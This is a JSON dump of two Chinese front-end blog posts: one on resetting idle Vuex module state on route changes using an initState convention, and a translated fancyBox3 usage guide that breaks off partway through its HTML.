{"_id":{"$oid":"5a4cc1f937991328ecbc7454"},"id":"5a4c8da3f265da43085e6c64","author":{"$oid":"5a4cc1f937991328ecbc7442"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"vuex 闲置状态重置方案","meta":{"likeCount":0},"tag":["Vuex","前端","Vue.js","API"],"comment":[],"shortContent":"大型单页应用（后面都是指spa），我们往往会通过使用状态管理器 vuex 去解决组件间状态共享与状态传递等问题。这种应用少则几十个单页，多则上百个单页。随着路由的频繁切换，每个路由对应的 vuex 中的状态将越来越多。为了做到页面的极致优化，我们需要将那些闲置的状态重置，以减小…","content":"\u003ch3 class=\"heading\"\u003e前言\u003c/h3\u003e\n\u003cp\u003e大型单页应用（后面都是指spa），我们往往会通过使用状态管理器 vuex 去解决组件间状态共享与状态传递等问题。这种应用少则几十个单页，多则上百个单页。随着路由的频繁切换，每个路由对应的 vuex 中的状态将越来越多。为了做到页面的极致优化，我们需要将那些闲置的状态重置，以减小占用的内存空间。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e什么状态可以重置\u003c/h3\u003e\n\u003cp\u003evuex 强调采用集中式存储管理应用的所有组件的状态，但是我们真把所有的状态都放到 store 中去处理，你会发现开发起来非常痛苦。这里如果想很好的把控哪些数据需要放到 store 中去管理，首先要理解 vuex 是用来解决什么问题的。vuex 官网指出是为了解决\u003cstrong\u003e多个组件共享状态\u003c/strong\u003e的，那么我们就可以把多个组件的共享状态放到 store 中去管理，这里的多组件共享对于单页应用很多情况是跨路由的组件。如果 store只存储多组件共享的状态，那么我们就没必要去清理 vuex 中的状态了，因为这些状态随时会被用到。\u003c/p\u003e\n\u003cp\u003e而随着业务场景越来越复杂，很多与后台交互的逻辑也都放到了组件中，这样代码就变得很凌乱，vuex 也没有被充分利用。这时我们可以把与后台 api 交互的逻辑放到 vuex 中的action 去处理，后台返回的状态自然也就放到了 store 管理。这样处理后，组件就只负责对数据进行渲染，逻辑非常清晰。而此时，组件对应的 store 中的状态随着路由的切换将会越来越多，而这些状态就需要我们手动的去清理了。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e很多方案都有取舍，如果将与后台 api 交互的数据放到组件中，就没必要去清理了，但是代码逻辑将变得比较乱。另外诸如 vuex 的插件 \u003ca target=\"_blank\" href=\"https://github.com/vuejs/vue-devtools\"\u003evue-devtools\u003c/a\u003e 将无法监控到每次请求数据的变化...\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e什么时候去重置状态\u003c/h3\u003e\n\u003cp\u003e我们想要的效果是在路由切换的时候，把上一个路由对应的 vuex 中的状态重置掉，但是路由和vuex 并没有一一对应的关系，如果要做到这种效果，那么我们需要维护一个路由与vuex 模块的对应关系，这样会很繁琐。不如当路由改变时去重置 vuex 中的所有状态。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003evuex 中闲置状态如何清理\u003c/h3\u003e\n\u003cp\u003e下面将结合\u003ca target=\"_blank\" href=\"https://github.com/huangshuwei/vuex-reset-state\"\u003e我的github实例\u003c/a\u003e去说明，这个实例创建了一个单页应用，我们通过切换路由的时候将闲置的状态清除。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e改造路由对应组件的 module 状态\u003c/h3\u003e\n\u003cp\u003e实例中采用拆分 store 为多个 module 的方式，将路由对应的组件状态放到对应的 module 中，多组件共享的状态放到顶级的 store 中管理。大致如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// store/index.js\nimport page1 from \u003cspan class=\"hljs-string\"\u003e\"./modules/page1.js\"\u003c/span\u003e;\nimport page2 from \u003cspan class=\"hljs-string\"\u003e\"./modules/page2.js\"\u003c/span\u003e;\nimport page3 from \u003cspan class=\"hljs-string\"\u003e\"./modules/page3.js\"\u003c/span\u003e;\nimport page4 from \u003cspan class=\"hljs-string\"\u003e\"./modules/page4.js\"\u003c/span\u003e;\nimport page5 from \u003cspan class=\"hljs-string\"\u003e\"./modules/page5.js\"\u003c/span\u003e;\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default new Vuex.Store({\n    state,\n    getters,\n    actions,\n    mutations,\n    modules: { // 每个路由对应的 module\n        page1,\n        page2,\n        page3,\n        page4,\n        page5\n    },\n    plugins: __DEV__ ? [createLogger()] : [],\n    strict: __DEV__ ? \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e路由 page1 对应的 module 的 state 形如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// store/modules/page1.js\nconst state = {\n     // 列表数据\n     page1Data: [],\n     // 标题数据\n     page1Title: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这些数据是通过调用后端 api 返回并复制的数据，如果我们在路由改变的时候重置这些数据，那么需要将初始化数据提取出来，并且暴露一个需要重置的标识方法 \u003ccode\u003einitState()\u003c/code\u003e，代表路由改变的时候需要重置，当然这个方法名称是个约定，你也可以定义为其他名称。改造后为：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// store/modules/page1.js\n\n// 放置你要重置的数据\nconst initState = {\n\n    page1Data: [],\n}\n\n// state\nconst state = {\n    // 参数解构\n    ...initState,\n\n    // 路由改变不想重置的数据\n    page1Title: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003einitState\u003c/span\u003e\u003c/span\u003e(){\n\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e initState\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e全局 module 配置\u003c/h3\u003e\n\u003cp\u003e定义全局 mutation 事件类型\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// store/types.js\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const RESET_STATES = \u003cspan class=\"hljs-string\"\u003e'resetStates'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e定义全局 mutation\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// store/mutation.js\n\nimport * as types from \u003cspan class=\"hljs-string\"\u003e'./types'\u003c/span\u003e\n\n// 检测所有的 state 并把 `initState()` 中的属性重置\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e resetState(state, moduleState) {\n\n    const mState = state[moduleState];\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (mState.initState \u0026amp;\u0026amp; typeof mState.initState === \u003cspan class=\"hljs-string\"\u003e'function'\u003c/span\u003e) {\n\n        const initState = mState.initState();\n\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (const key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e initState) {\n\n            mState[key] = initState[key];\n        }\n    }\n\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default {\n\n    [types.RESET_STATES](state, payload) {\n\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (const moduleState \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e state) {\n\n            resetState(state, moduleState);\n        }\n    },\n\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e定义全局 action\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// store/action.js\nimport * as types from \u003cspan class=\"hljs-string\"\u003e'./types'\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default {\n    // rest state action\n    resetStates:\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (context, payLoad) {\n\n        context.commit(types.RESET_STATES, payLoad);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e路由切换触发重置方法\u003c/h3\u003e\n\u003cp\u003e至此一切准备就绪，只需要在路由改变时触发重置的方法即可，在入口 vue 文件中处理\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// components/app.vue\n\u0026lt;script\u0026gt;\n    import {mapState, mapActions} from \u003cspan class=\"hljs-string\"\u003e\"vuex\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default{\n\n        methods: {\n\n            ...mapActions({\n                resetStates: \u003cspan class=\"hljs-string\"\u003e\"resetStates\"\u003c/span\u003e\n            })\n        },\n\n        watch: {\n\n            \u003cspan class=\"hljs-variable\"\u003e$route\u003c/span\u003e(to, from) {\n                // 路由改变发起重置\n                this.resetStates();\n            }\n        }\n    }\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果你的 chrome 浏览器安装了 \u003ca target=\"_blank\" href=\"https://chrome.google.com/webstore/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd?utm_source=chrome-app-launcher-info-dialog\"\u003evuejs-devtools\u003c/a\u003e 在路由切换的时候就能够很清晰的看到上一个路由数据的的重置过程。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e总结\u003c/h3\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/huangshuwei/vuex-reset-state\"\u003e实例点这里\u003c/a\u003e。我们这里的 vuex 状态重置，是每次路由切换遍历所有的 store 中的状态，并把\u003ccode\u003einitState()\u003c/code\u003e 中的属性重置，如果能做到把当前的路由对应的 state 重置就更好了，但是路由和 store 中的 module 并没有关联关系。这里只是提供一种重置 vuex 状态的一种方案，如果有更好方案还请各位看官留言。如有不妥的地方也欢迎拍砖留言。\u003c/p\u003e\n\u003cp\u003e--完--\u003c/p\u003e\n","buildTime":"1514979806.1708","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c070c"},"id":"5a30c475f265da430a509184","author":{"$oid":"5a4b765a751bf823c002e912"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"【翻译】fancyBox3 中文文档","meta":{"likeCount":0},"tag":["前端","掘金翻译计划"],"comment":[],"shortContent":"1. 介绍 fancyBox 是一个 JavaScript 库，它以优雅的方式展示图片，视频和一些 html 内容。它包含你所期望的一切特性 —— 支持触屏，响应式和高度自定义。 推荐 jQuery 3+，但是 fancyBox 仍支持 jQery 1.9.1+ 和 jQuer…","content":"\u003ch1 class=\"heading\"\u003efancyBox3 中文文档\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e译文永久地址：\u003ca target=\"_blank\" href=\"https://kangkai124.github.io/fancybox/\"\u003ehttps://kangkai124.github.io/fancybox/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e说明：本文档仅供参考，更新不及时请查看\u003ca target=\"_blank\" href=\"https://fancyapps.com/fancybox/3/docs/\"\u003e官方文档\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e1. 介绍\u003c/h2\u003e\n\u003cp\u003efancyBox 是一个 JavaScript 库，它以优雅的方式展示图片，视频和一些 html 内容。它包含你所期望的一切特性 —— 支持触屏，响应式和高度自定义。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1.1 依赖\u003c/h3\u003e\n\u003cp\u003e推荐 jQuery 3+，但是 fancyBox 仍支持 jQery 1.9.1+ 和 jQuery 2+ 。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意\u003c/p\u003e\n\u003cp\u003e如果你在图片缩放时遇到了问题，请升级 jQuery 到最近版本（至少v3.2.1）。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e1.2 兼容\u003c/h3\u003e\n\u003cp\u003efancyBox 支持触屏操作，而且支持缩放等手势操作。在移动端和PC端上都十分合适。\u003c/p\u003e\n\u003cp\u003efancyBox 已经在下列浏览器中测试：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eChrome\u003c/li\u003e\n\u003cli\u003efirefox\u003c/li\u003e\n\u003cli\u003eIE10/11\u003c/li\u003e\n\u003cli\u003eEdge\u003c/li\u003e\n\u003cli\u003eIOS Safari\u003c/li\u003e\n\u003cli\u003eNexus 7 Chrome\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e2. 配置\u003c/h2\u003e\n\u003cp\u003e可以在 html 文档中引入\u003ccode\u003e.css\u003c/code\u003e和\u003ccode\u003e.js\u003c/code\u003e来使用fancyBox，确保在这之前引入了 jQuery 库。下面是使用fancyBox的一个基本的HTML模板：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html\u0026gt;\n\u0026lt;head\u0026gt;\n\u0009\u0026lt;meta charset=\"utf-8\"\u0026gt;\n\u0009\u0026lt;title\u0026gt;My page\u0026lt;/title\u0026gt;\n\n\u0009\u0026lt;!-- CSS --\u0026gt;\n\u0009\u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"jquery.fancybox.min.css\"\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n\n\u0009\u0026lt;!-- Your HTML content goes here --\u0026gt;\n\n\u0009\u0026lt;!-- JS --\u0026gt;\n\u0009\u0026lt;script src=\"//code.jquery.com/jquery-3.2.1.min.js\"\u0026gt;\u0026lt;/script\u0026gt;\n\u0009\u0026lt;script src=\"jquery.fancybox.min.js\"\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e注意\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e要先引入jQuery\u003c/li\u003e\n\u003cli\u003e如果页面中已经引入过jQuery，不能再次引入\u003c/li\u003e\n\u003cli\u003e不要同时引入 \u003ccode\u003efancybox.js\u003c/code\u003e 和 \u003ccode\u003efancybox.min.js\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e一些方法（ajax，iframes 等）必须在一个web服务器上才可以正常运行，在浏览器打开一个本地文件是无法正常工作的\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e2.1 下载fancyBox\u003c/h3\u003e\n\u003cp\u003e可以在 \u003ca target=\"_blank\" href=\"https://github.com/fancyapps/fancybox\"\u003eGIthub\u003c/a\u003e 下载最新的版本。\u003c/p\u003e\n\u003cp\u003e或者直接引用 cdnjs —\u003ca target=\"_blank\" href=\"https://cdnjs.com/libraries/fancybox\"\u003ehttps://cdnjs.com/libraries/fancybox\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2.2 包管理工具\u003c/h3\u003e\n\u003cp\u003efancyBox 还可以通多 npm 和 Bower安装。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e# NPM\nnpm install @fancyapps/fancybox --save\n\n# Bower\nbower install fancybox --save\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e3. 使用\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e3.1 使用 data 属性初始化\u003c/h3\u003e\n\u003cp\u003e最基本的用法是通过添加 \u003ccode\u003edata-fancybox\u003c/code\u003e 属性到一个超链接标签。标题可以通过 \u003ccode\u003edata-capiton\u003c/code\u003e 添加。例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"image.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-caption\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"My caption\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"thumbnail.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ealt\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/rYLzBR?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e这种方式使用默认的配置，可以查看\u003ca target=\"_blank\" href=\"http://fancyapps.com/fancybox/3/docs/#options\"\u003e选项\u003c/a\u003e进行自定义配置，或者使用\u003ccode\u003edata-options\u003c/code\u003e属性。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3.2 使用 JavaScript 初始化\u003c/h3\u003e\n\u003cp\u003e使用 jQuery 选择器选择一个元素，然后调用\u003ccode\u003efancybox\u003c/code\u003e方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u0026lt;script type=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e\u0026gt;\n\u0009$(\u003cspan class=\"hljs-string\"\u003e\"[data-fancybox]\"\u003c/span\u003e).fancybox({\n\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// Options will go here\u003c/span\u003e\n\u0009});\n\u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/JOKyYo?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e使用这种方式，只有被选中的元素才可以触发点击事件。\u003c/p\u003e\n\u003cp\u003e为了可以现在或之后存在的元素都可以触发点击事件，使用\u003ccode\u003eselector\u003c/code\u003e选项。例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$().fancybox({\n  \u003cspan class=\"hljs-attr\"\u003eselector\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'[data-fancybox=\"images\"]'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003eloop\u003c/span\u003e     : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/zPBEdz?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3.3 手动调用 fancyBox\u003c/h3\u003e\n\u003cp\u003efancyBox 允许使用 JavaScrip t以任意形式触发，因此不必需要通过某一个元素触发。下面例子为展示一段简单的信息：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.open(\u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"message\"\u0026gt;\u0026lt;h2\u0026gt;Hello!\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;You are awesome!\u0026lt;/p\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/xPOLVb?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e通过 \u003ca target=\"_blank\" href=\"http://fancyapps.com/fancybox/3/docs/#api\"\u003eAPI\u003c/a\u003e 查看更多的信息和例子。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3.4 分组\u003c/h3\u003e\n\u003cp\u003e如果你有一组元素，组内元素使用相同的 \u003ccode\u003edata-fancybox\u003c/code\u003e 值就可以组成一个相册。不同的组应该使用不同的属性值加以区分。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"image_1.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"group\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-caption\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Caption #1\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"thumbnail_1.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ealt\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"image_2.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"group\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-caption\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Caption #2\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"thumbnail_2.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ealt\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/qVNXrZ?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意\u003c/p\u003e\n\u003cp\u003efancyBox根据给定的url自己尝试检测内容的类型。如果无法检测，该类型可以使用\u003ccode\u003edata-type\u003c/code\u003e属性手动添加。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"images.php?id=123\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-type\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"image\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-caption\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Caption\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009Show image\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e4. 媒体类型\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e4.1 图片\u003c/h3\u003e\n\u003cp\u003e使用 fancyBox 的标准做法是用小尺寸的图片链接到大尺寸图片：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"image.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"images\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-caption\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"My caption\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"thumbnail.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ealt\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/mqEMGX?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e默认情况下，fancyBox 会在一张图片展示前进行预加载。你可以选择立即显示图片，这样当加载完成后会马上渲染和显示完整尺寸的图片。不过，以下属性是必须添加的：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003edata-width\u003c/code\u003e - 图片的完整宽度\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edata-height\u003c/code\u003e - 图片的完整高度\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"image.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"images\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-width\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"2048\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-height\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"1365\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"thumbnail.jpg\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/JOKywE?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003efancyBox 支持 \u003ccode\u003escrset\u003c/code\u003e，它的作用是根据不同的可视区域显示不同尺寸的图片。你可以使用这个属性来减少移动端用户的下载时间。例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"medium.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"images\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-srcset\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"large.jpg 1600w, medium.jpg 1200w, small.jpg 640w\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan 